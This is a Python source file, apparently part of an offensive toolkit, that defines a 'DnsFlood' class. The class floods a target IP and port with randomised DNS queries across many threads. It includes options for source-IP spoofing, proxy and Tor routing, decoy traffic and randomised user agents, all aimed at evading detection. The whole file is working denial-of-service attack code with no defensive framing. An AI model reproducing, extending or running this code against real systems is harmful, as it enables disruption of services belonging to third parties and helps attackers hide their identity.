import socket
import random
import time
import logging
from colorama import init, Fore
from .ip_rotation import generate_multiple_ips
from .payload_randomization import randomize_dns_payload
from .concurrent_sender import start_concurrent_sending
from .rate_limiter import AdaptiveRateLimiter
from .domain_permutation import generate_domain_permutations
from .proxy_manager import get_random_proxy, check_proxy
from .user_agents import get_random_user_agent
from .interval_timing import get_dynamic_interval
from .decoy_traffic import send_decoy_traffic
from .tor_integration import get_tor_session, check_tor_connection

init(autoreset=True)

class DnsFlood:
    def __init__(self, target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=False, spoof_ip=False, num_threads=10, use_proxy=False, use_tor=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.extensions = extensions
        self.max_packets = max_packets
        self.max_duration = max_duration
        self.interval_range = interval_range
        self.log_to_file = log_to_file
        self.spoof_ip = spoof_ip
        self.num_threads = num_threads
        self.use_proxy = use_proxy
        self.use_tor = use_tor
        self.is_running = True
        self.rate_limiter = AdaptiveRateLimiter(initial_rate=random.uniform(*interval_range))
        
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
        if self.log_to_file:
            logging.basicConfig(filename='dns_flood.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    def get_random_domain(self):
        domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        extension = random.choice(self.extensions)
        return f"{domain}.{extension}"

    def attack(self):
        logging.info(f"Starting DNS Flood attack to {self.target_ip}:{self.target_port}")
        
        try:
            ips = generate_multiple_ips(self.num_threads) if self.spoof_ip else [None] * self.num_threads

            def send_packets(spoofed_ip):
                session = None
                if self.use_tor:
                    session = get_tor_session()
                    if not check_tor_connection():
                        logging.error("Tor connection failed")
                        return

                while self.is_running:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    if spoofed_ip:
                        sock.bind((spoofed_ip, 0))
                    
                    packet_count = 0
                    start_time = time.time()
                    
                    while self.is_running and packet_count < self.max_packets and (time.time() - start_time) < self.max_duration:
                        domain = self.get_random_domain()
                        permutations = generate_domain_permutations(domain)
                        for perm_domain in permutations:
                            dns_query = randomize_dns_payload(perm_domain)
                            
                            if self.use_proxy:
                                proxy = get_random_proxy()
                                if check_proxy(proxy):
                                    sock.sendto(dns_query, (self.target_ip, self.target_port))
                            elif session:
                                try:
                                    session.get(f"http://{self.target_ip}:{self.target_port}", headers={"User-Agent": get_random_user_agent()})
                                except Exception as e:
                                    logging.error(Fore.RED + f"Tor session error: {e}")
                                    continue
                            else:
                                sock.sendto(dns_query, (self.target_ip, self.target_port))
                            
                            logging.debug(Fore.GREEN + f"Sent DNS query for domain: {perm_domain} from IP: {spoofed_ip if spoofed_ip else 'original'}")
                            packet_count += 1
                            self.rate_limiter.sleep()
                            self.rate_limiter.adjust_rate(success=True)
                    
                    sock.close()
                    send_decoy_traffic(self.target_ip, self.target_port)
            
            start_concurrent_sending(send_packets, args=(None,), num_threads=self.num_threads)

        except socket.error as e:
            logging.error(Fore.RED + f"Socket error: {e}")
        except Exception as e:
            logging.error(Fore.RED + f"Unexpected error: {e}")
        
        logging.info(f"DNS Flood attack to {self.target_ip}:{self.target_port} finished")

    def stop_attack(self):
        self.is_running = False
